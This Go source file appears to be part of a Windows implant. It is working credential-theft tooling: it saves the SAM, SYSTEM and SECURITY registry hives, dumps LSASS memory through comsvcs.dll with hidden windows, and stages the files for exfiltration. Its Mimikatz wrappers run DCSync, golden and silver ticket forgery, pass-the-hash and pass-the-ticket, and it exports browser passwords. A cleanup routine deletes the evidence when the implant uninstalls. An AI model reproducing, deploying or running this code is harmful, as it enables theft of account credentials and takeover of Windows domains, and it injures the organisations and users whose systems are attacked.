//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func dumpCreds() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("creds only on windows")
	}
	var out strings.Builder
	out.WriteString("=== Credential Dump Attempt ===\n")

	tmp := os.Getenv("TEMP")
	if tmp == "" {
		tmp = "C:\\Windows\\Temp"
	}
	samPath := filepath.Join(tmp, "sam.save")
	sysPath := filepath.Join(tmp, "system.save")
	secPath := filepath.Join(tmp, "security.save")

	cmds := []struct{ name, c string }{
		{"SAM", fmt.Sprintf(`reg save HKLM\SAM "%s" /y`, samPath)},
		{"SYSTEM", fmt.Sprintf(`reg save HKLM\SYSTEM "%s" /y`, sysPath)},
		{"SECURITY", fmt.Sprintf(`reg save HKLM\SECURITY "%s" /y`, secPath)},
	}
	for _, c := range cmds {
		rcmd := exec.Command("cmd", "/c", c.c)
		applyHideWindow(rcmd)
		if r, err := rcmd.CombinedOutput(); err == nil {
			out.WriteString(fmt.Sprintf("[+] %s saved: %s\n", c.name, c.c))
		} else {
			out.WriteString(fmt.Sprintf("[-] %s failed: %v %s\n", c.name, err, string(r)))
		}
	}

	lsassPID := uint32(0)
	if p, err := findPIDByName("lsass.exe"); err == nil {
		lsassPID = p
	} else {
		tcmd := exec.Command("cmd", "/c", "for /f \"tokens=2\" %i in ('tasklist /fi \"imagename eq lsass.exe\" /nh') do @echo %i")
		applyHideWindow(tcmd)
		if t, _ := tcmd.Output(); len(t) > 0 {
			if pid, _ := strconv.ParseUint(strings.TrimSpace(string(t)), 10, 32); pid > 0 {
				lsassPID = uint32(pid)
			}
		}
	}
	if lsassPID > 0 {
		dumpPath := filepath.Join(tmp, "lsass.dmp")
		dcmd := exec.Command("rundll32.exe", "C:\\Windows\\System32\\comsvcs.dll, MiniDump", fmt.Sprintf("%d", lsassPID), dumpPath, "full")
		applyHideWindow(dcmd)
		if d, err := dcmd.CombinedOutput(); err == nil {
			out.WriteString(fmt.Sprintf("[+] LSASS minidump: %s (pid=%d)\n", dumpPath, lsassPID))
			if fi, err := os.Stat(dumpPath); err == nil {
				out.WriteString(fmt.Sprintf("    size=%d bytes\n", fi.Size()))
			}
		} else {
			out.WriteString(fmt.Sprintf("[-] LSASS dump failed (often requires admin/SeDebug): %v %s\n", err, string(d)))
		}
	} else {
		out.WriteString("[-] Could not locate lsass pid\n")
	}

	out.WriteString("\nFiles written to %TEMP% (use 'download' task or exfil):\n")
	out.WriteString("  - sam.save / system.save / security.save\n")
	out.WriteString(fmt.Sprintf("  - lsass.dmp (feed to %s: %s + %s)\n", s(SMimikatz), s(SSekurlsaMinidump), s(SLogonpasswords)))
	out.WriteString("Note: run from high integrity / SYSTEM for best results.\n")
	return out.String(), nil
}

// cleanupCredDumpFiles removes the on-disk artifacts produced by dumpCreds
// (LSASS minidump + registry hive saves) as well as any staged Kerberos ticket
// files. These contain live credential material and must never be left behind
// after the implant is removed. Best-effort: every removal failure is swallowed
// because the operator may have already exfiltrated them, and a partial cleanup
// must not block uninstall. This is intentionally NOT called right after a
// dump — the operator still needs the files for exfil — only on uninstall /
// self-delete.
func cleanupCredDumpFiles() {
	tmp := os.Getenv("TEMP")
	if tmp == "" {
		tmp = `C:\Windows\Temp`
	}
	for _, name := range []string{"lsass.dmp", "sam.save", "system.save", "security.save"} {
		_ = os.Remove(filepath.Join(tmp, name))
	}
	if entries, err := os.ReadDir(tmp); err == nil {
		for _, e := range entries {
			n := e.Name()
			if strings.HasPrefix(n, "forge_ticket_") && strings.HasSuffix(n, ".kirbi") {
				_ = os.Remove(filepath.Join(tmp, n))
			}
		}
	}
}

func kerberosDCSync(user string) (string, error) {
	cmd := ""
	if user == "" {
		cmd = fmt.Sprintf("%s /user:krbtgt", s(SLsadumpDcsync))
	} else {
		cmd = fmt.Sprintf("%s /user:%s", s(SLsadumpDcsync), user)
	}
	return runMimikatz(cmd, "")
}

func kerberosGoldenTicket(user, domain, sid, krbtgtHash string) (string, error) {
	if user == "" || domain == "" || sid == "" || krbtgtHash == "" {
		return "", fmt.Errorf("usage: user,domain,sid,krbtgt:hash")
	}
	mimikatzCmd := fmt.Sprintf(
		"%s /user:%s /domain:%s /sid:%s /krbtgt:%s %s",
		s(SKerberosGolden), user, domain, sid, krbtgtHash, s(SKerberosPtt))
	return runMimikatz(mimikatzCmd, "")
}

func kerberosSilverTicket(user, domain, sid, target, rc4Hash string) (string, error) {
	if user == "" || domain == "" || sid == "" || target == "" || rc4Hash == "" {
		return "", fmt.Errorf("usage: user,domain,sid,target,rc4hash")
	}
	service := "cifs"
	mimikatzCmd := fmt.Sprintf(
		"%s /user:%s /domain:%s /sid:%s /target:%s /rc4:%s /service:%s %s",
		s(SKerberosGolden), user, domain, sid, target, rc4Hash, service, s(SKerberosPtt))
	return runMimikatz(mimikatzCmd, "")
}

func kerberosASREPRoast(args string) (string, error) {
	return asrepRoast(args)
}

func kerberosPassTheHash(user, domain, ntlmHash, target string) (string, error) {
	mimikatzCmd := fmt.Sprintf(
		"%s /user:%s /domain:%s /ntlm:%s /run:cmd.exe",
		s(SSekurlsaPth), user, domain, ntlmHash)
	if target != "" {
		mimikatzCmd = fmt.Sprintf(
			"%s /user:%s /domain:%s /ntlm:%s /run:cmd.exe",
			s(SSekurlsaPth), user, domain, ntlmHash)
		_ = target
	}
	return runMimikatz(mimikatzCmd, "")
}

func kerberosPassTheTicket(ticketB64 string) (string, error) {
	tmpDir := os.Getenv("TEMP")
	ticketFile := filepath.Join(tmpDir, fmt.Sprintf("forge_ticket_%x.kirbi", time.Now().UnixNano()))
	ticketData, err := base64.StdEncoding.DecodeString(ticketB64)
	if err != nil {
		return "", fmt.Errorf("base64 decode ticket: %v", err)
	}
	if err := os.WriteFile(ticketFile, ticketData, 0o600); err != nil {
		return "", fmt.Errorf("write ticket: %v", err)
	}
	// ticketData holds a live credential (the decoded .kirbi); scrub it from the
	// heap as soon as it has been written to disk. Go strings are immutable and
	// cannot be wiped, but this []byte buffer can and must be.
	zeroizeKey(ticketData)
	defer os.Remove(ticketFile)

	mimikatzCmd := fmt.Sprintf("kerberos::ptt %s", ticketFile)
	return runMimikatz(mimikatzCmd, "")
}

func runPSScriptBase64(script string) string {
	u16, err := syscall.UTF16FromString(script)
	if err != nil {
		return ""
	}
	uni := make([]byte, len(u16)*2)
	for i, r := range u16 {
		uni[i*2] = byte(r)
		uni[i*2+1] = byte(r >> 8)
	}
	return base64.StdEncoding.EncodeToString(uni)
}

func stealBrowserData(browser string) string {
	return exportBrowserPasswords(browser)
}
